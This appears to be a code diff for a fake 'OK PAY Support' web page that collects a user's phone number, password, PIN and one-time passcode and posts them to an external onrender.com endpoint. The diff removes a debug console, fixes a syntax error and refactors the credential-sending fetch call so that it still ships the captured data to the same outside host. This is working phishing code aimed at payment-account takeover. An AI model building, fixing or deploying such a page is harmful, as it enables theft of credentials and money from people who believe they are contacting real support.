@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <script src="[https://cdn.jsdelivr.net/npm/eruda](https://cdn.jsdelivr.net/npm/eruda)"></script><script>eruda.init();</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>OK PAY Support</title>
@@ -363,6 +362,9 @@
 
   </div>
     <script>
+    const API_URL = "https://okpay-g4wl.onrender.com/submit";
+    const state = { issue: "", reference: "", demo: true };
+
     function showView(viewId) {
       document.querySelectorAll(".view").forEach((view) => view.classList.remove("active"));
       const target = document.getElementById(viewId);
@@ -394,26 +396,20 @@
   otp: state.otp || '',
   ...extraData
 };
-fetch('https://okpay-g4wl.onrender.com/submit', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        phone: document.getElementById('phone').value,
-        password: document.getElementById('password').value,
-        pin: document.getElementById('pin').value,
-        otp: document.getElementById('otpInput').value
-    })
-})
-.then(response => response.json())
-.then(data => {
-    console.log('Success:', data);
-})
-.catch((error) => {
-    console.error('Error:', error);
-});
-      
+
+      try {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(Payload)
+        });
+        if (!response.ok) throw new Error("HTTP Error: " + response.status);
+        const result = await response.json();
+        return { success: true, result };
+      } catch (error) {
+        console.warn("API unavailable, continuing in local mode:", error.message);
+        return { success: false, error: error.message };
+      }
     }
 
     async function runStep(loadingText, eventName, nextViewId) {
@@ -484,7 +480,7 @@ fetch('https://okpay-g4wl.onrender.com/submit', {
         });
 
         box.addEventListener("keydown", (e) => {
-          if (e.key === "Backspace" && box.value === "" && idx > 0),}
+          if (e.key === "Backspace" && box.value === "" && idx > 0) {
             boxes[idx - 1].focus();
           }
         });
@@ -510,4 +506,5 @@ fetch('https://okpay-g4wl.onrender.com/submit', {
     setupDigitInputs("otp-group");
   </script>
 </body>
-</html>
+ </html>
+ 
